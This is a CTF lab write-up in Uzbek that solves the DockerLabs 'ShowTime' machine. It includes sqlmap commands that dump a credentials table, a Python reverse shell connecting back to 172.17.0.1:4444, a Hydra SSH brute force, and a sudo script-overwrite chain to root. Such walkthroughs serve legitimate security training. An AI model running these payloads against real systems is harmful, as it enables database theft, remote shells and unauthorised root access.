# ShowTime-dockerlabs

```
IP: 172.17.0.2
OS: Linux
Ports: 22 SSH, 80 http
Users: joe, luciano, root, ubuntu
Vulnerability: SQL Injection, Python RCE in admin panel, sudo misconfiguration chain
```

## root flag:
> 📸 Screenshot (Notion sahifasida)

## user flag:
> 📸 Screenshot (Notion sahifasida)

---

# 1. Enumeration

Mashinamiz nomi `ShowTime`. Ochiq portlarni aniqladim:

```bash
nmap -sV -sC -A -p- --min-rate 1000 172.17.0.2
```

- 22 SSH
- 80 HTTP — online kazino platformasi

Login sahifada SQL Injection sinab ko'rdim — muvofaqiyatli bo'ldi.

---

# 2. Exploitation

SQLMap bilan database'larni o'qidim:

```bash
sqlmap --url http://172.17.0.2/login_page/ --dbs --batch --forms
```

```bash
sqlmap -u "http://172.17.0.2/login_page/" --forms --batch -D users --tables
```

```bash
sqlmap --url http://172.17.0.2/login_page/ --batch --forms -D users -T usuarios --dump
```

3 ta credential topildi. Faqat `joe` bilan admin panelga kirish mumkin ekan. Admin panelda Python kodi ishga tushirish imkoni bor ekan. Reverse shell oldim:

```python
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.17.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

---

# 3. Initial Access

`www-data` sheli olindi. `/tmp/.hidden_text.txt` faylida GTA SA cheat kodlari ro'yxati topildi. Ularni lowercase qilib password list yasadim:

```bash
tr '[:upper:]' '[:lower:]' < password.txt > password-list.txt
```

Hydra bilan `joe` parolini topdim: **chittychittybangbang**

```bash
hydra -l joe -P password-list.txt ssh://172.17.0.2
```

---

# 4. Privilege Escalation

`joe` → `luciano`: `/bin/posh` ni `luciano` nomidan ishga tushirish:

```bash
sudo -u luciano /bin/posh
```

`luciano` home'da `script.sh` fayli bor. `luciano` bu faylni root nomidan ishga tushira oladi, va faylga yozish huquqi ham bor:

```bash
echo "/bin/bash" > /home/luciano/script.sh
sudo /bin/bash /home/luciano/script.sh
```

Root huquqi olindi!

---

**Mashina muvofaqiyatli yechildi!**
